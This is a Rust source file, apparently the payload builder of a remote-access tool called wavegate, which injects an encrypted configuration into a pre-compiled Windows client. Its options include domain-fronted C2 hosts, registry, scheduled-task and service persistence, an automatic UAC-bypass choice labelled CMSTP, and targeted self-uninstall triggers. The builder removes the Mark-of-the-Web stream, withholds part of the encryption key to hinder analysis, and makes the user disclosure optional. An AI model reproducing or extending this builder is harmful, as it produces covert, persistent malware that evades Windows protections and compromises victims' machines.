//! Client builder module.
//!
//! Injects encrypted configuration into the pre-compiled waveclient template.
//! No source code compilation - just PE resource injection.

use std::path::{Path, PathBuf};
use std::fs;

use wavegate_shared::{
    ClientConfig, PersistenceMethod, DnsMode, ElevationMethod,
    DisclosureConfig, DisclosureIcon, UninstallTrigger,
    ProxyConfig, ProxyType,
};
use serde::{Deserialize, Serialize};
use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::Aead};
use chacha20poly1305::aead::generic_array::GenericArray;

/// Magic bytes at start of config for validation (must match client)
const CONFIG_MAGIC: &[u8] = b"RGCFG001";

/// Build request from the frontend
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildRequest {
    // Connection
    pub primary_host: String,
    pub backup_host: Option<String>,
    pub port: u16,
    /// Custom SNI hostname for TLS (domain fronting)
    #[serde(default)]
    pub sni_hostname: Option<String>,

    // WebSocket mode
    #[serde(default)]
    pub websocket_mode: bool,
    #[serde(default)]
    pub websocket_path: Option<String>,

    // Proxy settings
    #[serde(default)]
    pub use_proxy: bool,
    #[serde(default)]
    pub proxy_type: Option<String>,  // "http" or "socks5"
    #[serde(default)]
    pub proxy_host: Option<String>,
    #[serde(default)]
    pub proxy_port: Option<u16>,
    #[serde(default)]
    pub proxy_username: Option<String>,
    #[serde(default)]
    pub proxy_password: Option<String>,

    // Build info
    pub build_id: String,

    // Behavior
    pub request_elevation: bool,
    #[serde(default)]
    pub elevation_method: Option<String>,
    pub run_on_startup: bool,
    pub persistence_method: String,
    pub clear_zone_id: bool,
    pub prevent_sleep: bool,
    pub run_delay_secs: u32,
    pub connect_delay_secs: u32,
    pub restart_delay_secs: u32,

    // DNS
    pub dns_mode: String,
    pub primary_dns: Option<String>,
    pub backup_dns: Option<String>,

    // Disclosure
    pub show_disclosure: bool,
    pub disclosure_title: Option<String>,
    pub disclosure_message: Option<String>,

    // Uninstall trigger
    pub uninstall_trigger: String,
    pub trigger_datetime: Option<String>,
    pub nocontact_minutes: Option<u32>,
    pub trigger_username: Option<String>,
    pub trigger_hostname: Option<String>,
}

impl BuildRequest {
    /// Convert frontend request to ClientConfig
    pub fn to_client_config(&self) -> ClientConfig {
        let persistence_method = match self.persistence_method.as_str() {
            "Scheduled task" => PersistenceMethod::ScheduledTask,
            "Startup folder" => PersistenceMethod::StartupFolder,
            "Service installation" => PersistenceMethod::ServiceInstallation,
            _ => PersistenceMethod::RegistryAutorun,
        };

        let elevation_method = match self.elevation_method.as_deref() {
            Some("Auto (CMSTP)") => ElevationMethod::Auto,
            _ => ElevationMethod::Request,
        };

        let dns_mode = match self.dns_mode.as_str() {
            "custom" => DnsMode::Custom {
                primary: self.primary_dns.clone().unwrap_or_else(|| "8.8.8.8".to_string()),
                backup: self.backup_dns.clone(),
            },
            _ => DnsMode::System,
        };

        let disclosure = DisclosureConfig {
            enabled: self.show_disclosure,
            title: self.disclosure_title.clone()
                .unwrap_or_else(|| "Remote Support Client".to_string()),
            message: self.disclosure_message.clone()
                .unwrap_or_else(|| "This software enables remote technical support.".to_string()),
            icon: DisclosureIcon::Information,
        };

        let uninstall_trigger = match self.uninstall_trigger.as_str() {
            "Time/Date" => UninstallTrigger::DateTime {
                datetime: self.trigger_datetime.clone().unwrap_or_default(),
            },
            "No server contact" => UninstallTrigger::NoContact {
                minutes: self.nocontact_minutes.unwrap_or(120),
            },
            "Specific User" => UninstallTrigger::SpecificUser {
                username: self.trigger_username.clone().unwrap_or_default(),
            },
            "Specific Hostname" => UninstallTrigger::SpecificHostname {
                hostname: self.trigger_hostname.clone().unwrap_or_default(),
            },
            _ => UninstallTrigger::None,
        };

        // Generate a pseudo-random mutex name by hashing the build ID
        let mutex_name = {
            use std::collections::hash_map::DefaultHasher;
            use std::hash::{Hash, Hasher};
            let mut hasher = DefaultHasher::new();
            self.build_id.hash(&mut hasher);
            format!("{:016x}", hasher.finish())
        };

        // Build proxy config if enabled
        let proxy = if self.use_proxy {
            self.proxy_host.as_ref().map(|host| {
                let proxy_type = match self.proxy_type.as_deref() {
                    Some("socks5") => ProxyType::Socks5,
                    _ => ProxyType::Http,
                };
                ProxyConfig {
                    proxy_type,
                    host: host.clone(),
                    port: self.proxy_port.unwrap_or(8080),
                    username: self.proxy_username.clone(),
                    password: self.proxy_password.clone(),
                }
            })
        } else {
            None
        };

        ClientConfig {
            primary_host: self.primary_host.clone(),
            backup_host: self.backup_host.clone(),
            port: self.port,
            sni_hostname: self.sni_hostname.clone(),
            websocket_mode: self.websocket_mode,
            websocket_path: self.websocket_path.clone(),
            proxy,
            build_id: self.build_id.clone(),
            mutex_name,
            request_elevation: self.request_elevation,
            elevation_method,
            run_on_startup: self.run_on_startup,
            persistence_method,
            prevent_sleep: self.prevent_sleep,
            run_delay_secs: self.run_delay_secs,
            connect_delay_secs: self.connect_delay_secs,
            restart_delay_secs: self.restart_delay_secs,
            dns_mode,
            disclosure,
            uninstall_trigger,
        }
    }
}

/// Result of a build operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildResult {
    pub success: bool,
    pub output_path: Option<String>,
    pub error: Option<String>,
    pub build_output: String,
}

/// Build errors
#[derive(Debug)]
pub enum BuildError {
    TemplateNotFound(String),
    IoError(String),
    EncryptionError(String),
    ResourceInjectionError(String),
    ValidationError(String),
}

impl std::fmt::Display for BuildError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::TemplateNotFound(msg) => write!(f, "Template not found: {}", msg),
            Self::IoError(msg) => write!(f, "IO error: {}", msg),
            Self::EncryptionError(msg) => write!(f, "Encryption error: {}", msg),
            Self::ResourceInjectionError(msg) => write!(f, "Resource injection error: {}", msg),
            Self::ValidationError(msg) => write!(f, "Validation error: {}", msg),
        }
    }
}

impl std::error::Error for BuildError {}

/// Get the directory where the server executable is located
fn get_exe_directory() -> Result<PathBuf, BuildError> {
    std::env::current_exe()
        .map_err(|e| BuildError::IoError(e.to_string()))?
        .parent()
        .map(|p| p.to_path_buf())
        .ok_or_else(|| BuildError::IoError("Could not get executable directory".to_string()))
}

/// Find the waveclient template binary
fn find_template() -> Result<PathBuf, BuildError> {
    let exe_dir = get_exe_directory()?;

    // Look for "waveclient" (no extension) in the same directory as the server
    let template_path = exe_dir.join("waveclient");

    if template_path.exists() {
        return Ok(template_path);
    }

    // Also try with .exe extension just in case
    let template_path_exe = exe_dir.join("waveclient.exe");
    if template_path_exe.exists() {
        return Ok(template_path_exe);
    }

    Err(BuildError::TemplateNotFound(format!(
        "waveclient not found in {}. Please place the pre-compiled client template there.",
        exe_dir.display()
    )))
}

/// Generate encryption key and encrypt config
/// Returns: (key_prefix[29], key_suffix[3], nonce[8], ciphertext)
fn encrypt_config(config: &ClientConfig) -> Result<(Vec<u8>, [u8; 3], [u8; 8], Vec<u8>), BuildError> {
    // Serialize config to JSON
    let config_json = serde_json::to_vec(config)
        .map_err(|e| BuildError::EncryptionError(format!("Failed to serialize config: {}", e)))?;

    // Prepend magic header
    let mut plaintext = CONFIG_MAGIC.to_vec();
    plaintext.extend_from_slice(&config_json);

    // Generate random key (32 bytes)
    let mut key = [0u8; 32];
    for b in &mut key {
        *b = fastrand::u8(..);
    }

    // Generate random nonce (8 bytes, will be padded to 24 for XChaCha20)
    let mut nonce = [0u8; 8];
    for b in &mut nonce {
        *b = fastrand::u8(..);
    }

    // Build full 24-byte nonce for XChaCha20
    let mut full_nonce = [0u8; 24];
    full_nonce[..8].copy_from_slice(&nonce);

    // Encrypt with XChaCha20-Poly1305
    let cipher = XChaCha20Poly1305::new(GenericArray::from_slice(&key));
    let ciphertext = cipher
        .encrypt(GenericArray::from_slice(&full_nonce), plaintext.as_slice())
        .map_err(|_| BuildError::EncryptionError("Encryption failed".to_string()))?;

    // Split key into prefix (29 bytes) and suffix (3 bytes)
    let key_prefix = key[..29].to_vec();
    let key_suffix: [u8; 3] = [key[29], key[30], key[31]];

    Ok((key_prefix, key_suffix, nonce, ciphertext))
}

/// Build the encrypted resource blob
/// Format: [key_prefix:29][nonce:8][ciphertext:N]
fn build_resource_blob(key_prefix: &[u8], nonce: &[u8; 8], ciphertext: &[u8]) -> Vec<u8> {
    let mut blob = Vec::with_capacity(29 + 8 + ciphertext.len());
    blob.extend_from_slice(key_prefix);
    blob.extend_from_slice(nonce);
    blob.extend_from_slice(ciphertext);
    blob
}

/// Inject resource into PE file using Windows API
fn inject_resource(pe_path: &Path, resource_data: &[u8]) -> Result<(), BuildError> {
    use windows::Win32::System::LibraryLoader::{
        BeginUpdateResourceW, UpdateResourceW, EndUpdateResourceW,
    };
    use windows::core::PCWSTR;

    // Convert path to wide string
    let path_wide: Vec<u16> = pe_path.to_string_lossy()
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        // Begin update
        let handle = BeginUpdateResourceW(PCWSTR(path_wide.as_ptr()), false)
            .map_err(|e| BuildError::ResourceInjectionError(format!("BeginUpdateResource failed: {}", e)))?;

        // Resource name "CONFIG" as wide string
        let resource_name: Vec<u16> = "CONFIG\0".encode_utf16().collect();

        // Update resource (type 256, name "CONFIG", language neutral)
        UpdateResourceW(
            handle,
            PCWSTR(256 as *const u16),  // Custom resource type 256
            PCWSTR(resource_name.as_ptr()),
            0,  // Language neutral
            Some(resource_data.as_ptr() as *const std::ffi::c_void),
            resource_data.len() as u32,
        ).map_err(|e| {
            let _ = EndUpdateResourceW(handle, true); // Discard changes
            BuildError::ResourceInjectionError(format!("UpdateResource failed: {}", e))
        })?;

        // Commit changes
        EndUpdateResourceW(handle, false)
            .map_err(|e| BuildError::ResourceInjectionError(format!("EndUpdateResource failed: {}", e)))?;
    }

    Ok(())
}

/// Build the client with the given configuration
pub fn build_client(request: &BuildRequest) -> BuildResult {
    match build_client_inner(request) {
        Ok((output_path, suffix_hex)) => BuildResult {
            success: true,
            output_path: Some(output_path),
            error: None,
            build_output: format!("Build completed successfully. Key suffix: {}", suffix_hex),
        },
        Err(e) => BuildResult {
            success: false,
            output_path: None,
            error: Some(e.to_string()),
            build_output: String::new(),
        },
    }
}

fn build_client_inner(request: &BuildRequest) -> Result<(String, String), BuildError> {
    // Validate: Service installation requires elevation
    if request.persistence_method == "Service installation" && !request.request_elevation {
        return Err(BuildError::ValidationError(
            "Service installation persistence requires UAC elevation to be enabled".to_string()
        ));
    }

    // Convert request to config
    let config = request.to_client_config();

    // Find template
    let template_path = find_template()?;

    // Ensure builds directory exists (next to server executable)
    let exe_dir = get_exe_directory()?;
    let builds_dir = exe_dir.join("builds");
    fs::create_dir_all(&builds_dir)
        .map_err(|e| BuildError::IoError(format!("Failed to create builds directory: {}", e)))?;

    // Generate output filename
    let output_name = format!("client_{}.exe", config.build_id.replace('.', "_").replace('-', "_"));
    let output_path = builds_dir.join(&output_name);

    // Copy template to output
    fs::copy(&template_path, &output_path)
        .map_err(|e| BuildError::IoError(format!("Failed to copy template: {}", e)))?;

    // Encrypt config
    let (key_prefix, key_suffix, nonce, ciphertext) = encrypt_config(&config)?;

    // Build resource blob
    let resource_blob = build_resource_blob(&key_prefix, &nonce, &ciphertext);

    // Inject resource into output binary
    inject_resource(&output_path, &resource_blob)?;

    // Clear Zone.Identifier if requested
    if request.clear_zone_id {
        clear_zone_identifier(&output_path);
    }

    // Format key suffix for logging (not exposed to user, just for debugging)
    let suffix_hex = format!("{:02X}{:02X}{:02X}", key_suffix[0], key_suffix[1], key_suffix[2]);

    Ok((output_path.to_string_lossy().to_string(), suffix_hex))
}

/// Clear the Zone.Identifier alternate data stream (Mark of the Web) from a file.
fn clear_zone_identifier(path: &Path) {
    let zone_id_path = format!("{}:Zone.Identifier", path.display());
    let _ = fs::remove_file(&zone_id_path);
}
